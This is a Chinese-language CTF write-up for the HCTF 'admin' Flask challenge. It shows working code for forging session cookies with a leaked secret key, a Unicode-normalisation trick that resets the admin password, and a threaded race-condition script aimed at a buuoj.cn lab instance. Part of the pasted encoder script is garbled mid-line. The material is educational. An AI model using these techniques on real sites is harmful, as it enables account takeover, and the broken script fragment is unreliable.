##  CTF题目

地址：HCTF-admin

### 非预期解

可以直接登录，利用弱口令

login页面，账号：admin，密码：123，就直接得到flag

###  预期解

首先进去看到几个界面，login，register,和登录成功后（自己注册然后登录）的四个界面。



然后在index页面源码发现提示，`you are not admin`，估计题目是让我们登录成admin，然后出flag，于是想到change password功能，可能可以通过改密码功能的漏洞改掉admin密码，然后以admin登录。



于是跳到change password页面，看看有没有进一步的发现，也是在网页源代码处发现了提示，这个提示直接把网站项目的github地址给了出来。



打开是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码

```python
@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html', title = 'hctf')
```

发现index注册函数没做什么处理，直接返回index.html渲染模版，于是我们看一下templates/index.html代码

```html
{% include('header.html') %}
{% if current_user.is_authenticated %}
<h1 class="nav">Hello {{ session['name'] }}</h1>
{% endif %}
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>

{% include('footer.html') %}
```

后面的部分代码

```python
@app.route('/register', methods = ['GET', 'POST'])
def register():

    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)

@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)

@app.route('/logout')
def logout():
    logout_user()
    return redirect('/index')

@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)
```

####  解法1---flask session伪造

flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的。还有些session是存储在数据库中或者服务器的文件里。

参考：flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的

参考：[客户端session](https://www.leavesongs.com/PENETRATION/client-session-security.html)

[Python Web之flask session&格式化字符串漏洞](https://xz.aliyun.com/t/3569)

[flask 源码解析：session](http://cizixs.com/2017/03/08/flask-insight-session/)



解题：

首先我们需要将抓包得到的session解密一下

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

```
命令行
python3 1.py session内容
```

解密后，我们还需要找到SECRET_KEY

搜索flask的SECRET_KEY，我们知道在config.py

```
SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
```

可能SECRET_KEY就是ckj123

然后在index.html页面发现只要session[‘name’] == 'admin’即可以得到flag

```python
{% include('header.html') %}
{% if current_user.is_authenticated %}
<h1 class="nav">Hello {{ session['name'] }}</h1>
{% endif %}
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>

{% include('footer.html') %}
```

改变解密后的name=admin

继续加密,加密脚本

```python
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else: # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4: # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else: # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_stru-\\nterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e


        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if(secret_key==None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
-
```

```
脚本有解密、加密两种功能，具体用法如下
解密:python flask_session_manager.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY
加密:python flask_session_manager.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式
```

得到签名后的session后，我们替换cookie就行了

注意的是

```
关于这个脚本，其实在运行的时候，我发现了点问题，就是当你解密的时候，要用到 -s -c两个参数，linux下，可以用'或"包围，而windows下只能用"，否则会报错。然后加密的话，windows能够生成加密后的session，但是用它来替换掉index页面的session的话不起作用(亲测)，一开始我在windows下面试的，结果一致出不来flag，后面突然想到用linux试一下，才发现这个问题(2333)。然后每次加密生成的session是不一样的，猜测应该是里面加入了时间戳信息
```

####  解法2----Unicode欺骗

strlower()导致的欺骗

```python
@app.route('/register', methods = ['GET', 'POST'])
def register():

    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data)        # 
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)

@app.route('/login', methods = ['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)    #  
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)

@app.route('/logout')
def logout():
    logout_user()
    return redirect('/index')

@app.route('/change', methods = ['GET', 'POST'])
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])    # 
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)
```

发现都使用了strlower()函数

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

这里用到了`nodeprep.prepare`函数，而nodeprep是从twisted模块中导入的`from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep`，在requirements.txt文件中，发现这里用到的twisted版本是`Twisted==10.2.0`.

这里原理就是利用nodeprep.prepare函数会将unicode字符`ᴬ`转换成`A`，而`A`在调用一次nodeprep.prepare函数会把`A`转换成`a`。
 所以当我们用`ᴬdmin`注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成`Admin`，我们用`ᴬdmin`进行登录，可以看到index页面的username变成了`Admin`，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。

然后发现在改密码的代码中也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为`admin`，从而改掉`admin`的密码。去login就可以直接登录了。



关于编码的查询：https://unicode-table.com/en/search/?q=small+capital 

关于转换为unicode：[Unicode编码转换 - 站长工具 (chinaz.com)](http://tool.chinaz.com/tools/unicode.aspx)



所以，直接将编码查询的结果（admin）去注册，然后登录，改密码，再次登录admin就可以了。

####   解法3---条件竞争

在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：
我们注册一个用户test，现在有一个进程1一直重复进行登录、改密码操作，进程2一直注销，且以admin用户和进程1所改的密码进行登录，是不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。

看网上写的

```python
import requests
import threading

def login(s, username, password):
    data = {
        'username': username,
        'password': password,
        'submit': ''
    }
    return s.post("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/login", data=data)

def logout(s):
    return s.get("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/logout")

def change(s, newpassword):
    data = {
        'newpassword':newpassword
    }
    return s.post("http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/change", data=data)

def func1(s):
    login(s, 'test', 'test')
    change(s, 'test')

def func2(s):
    logout(s)
    res = login(s, 'admin', 'test')
    if 'flag' in res.text:
        print('finish')

def main():
    for i in range(1000):
        print(i)
        s = requests.Session()
        t1 = threading.Thread(target=func1, args=(s,))
        t2 = threading.Thread(target=func2, args=(s,))
        t1.start()
        t2.start()

if __name__ == "__main__":
    main()
```
##  其他知识点
1.关于flask的serect_key
```
如果遇到了 Must provide secret_key to use csrf错误提醒，原因就是没有设置secret_key ，在代码中加上
```
app.config[‘SECRET_KEY‘]=‘xxx‘
```
SECRET_KEY最好不要写在代码中。
最好设置一个config.py文件，从中读取该内容
config.py
```
CSRF_ENABLED = True
SECRET_KEY = ‘you-will-never-guess‘
```
CSRF_ENABLED = True
SECRET_KEY = ‘you-will-never-guess‘
```
app.py
```
app.config.from_object(‘config‘)
```
app.config.from_object(‘config‘)
这样就可以防止csrf了

2.关于加密和签名的区别
```
数据签名和数据加密的过程都是使用公开的密钥系统，但实现的过程正好相反，

数据加密使用的是接受方的密钥对，任何知道接受方公钥的都可以向接受方发送消息，但是只有拥有私钥的才能解密出来；

数据签名使用的是发送方的密钥对，任何接受方都可以用公钥解密，验证数据的正确性。

一句话总结：

数据加密保证了数据接受方的数据安全性。

数据签名保证了数据发送方的数据安全性。

就拿A给B发送经过签名加密信息来说：
1、A对信息签名的作用是确认这个信息是A发出的，不是别人发出的；
2、加密是对内容进行机密性保护，主要是保证信息内容不会被其他人获取，只有B可以获取。

也就是保证整个过程的端到端的唯一确定性，这个信息是A发出的（不是别人），且是发给B的，只有B才被获得具体内容（别人就算截获信息也不能获得具体内容）。

这只是大概说了作用，具体说来，涉及到密钥相关的东西。密钥有公钥和私钥之分。

那么这里一共有两组四个密钥：A的公钥（PUB_A），A的私钥（PRI_A）；B的公钥（PUB_B），B的私钥（PRI_B）。

公钥一般用来加密，私钥用来签名。

通常公钥是公开出去的，但是私钥只能自己私密持有。

公钥和私钥唯一对应，用某个公钥签名过得内容只能用对应的私钥才能解签验证；同样用某个私钥加密的内容只能用对应的公钥才能解密。

这时A向B发送信息的整个签名和加密的过程如下：
1、A先用自己的私钥（PRI_A）对信息（一般是信息的摘要）进行签名。
2、A接着使用B的公钥（PUB_B）对信息内容和签名信息进行加密。

这样当B接收到A的信息后，获取信息内容的步骤如下：
1、用自己的私钥（PRI_B）解密A用B的公钥（PUB_B）加密的内容；
2、得到解密后的明文后用A的公钥（PUB_A）解签A用A自己的私钥（PRI_A）的签名。

从而整个过程就保证了开始说的端到端的唯一确认。A的签名只有A的公钥才能解签，这样B就能确认这个信息是A发来的；A的加密只有B的私钥才能解密，这样A就能确认这份信息只能被B读取。
参考：https://www.cnblogs.com/wgj-master/p/10435753.html
```
3.关于session，cookie和token
```
https://cloud.tencent.com/developer/article/1704064
```
4.关于python格式化字符串的漏洞
```
https://xz.aliyun.com/t/3569
https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html
```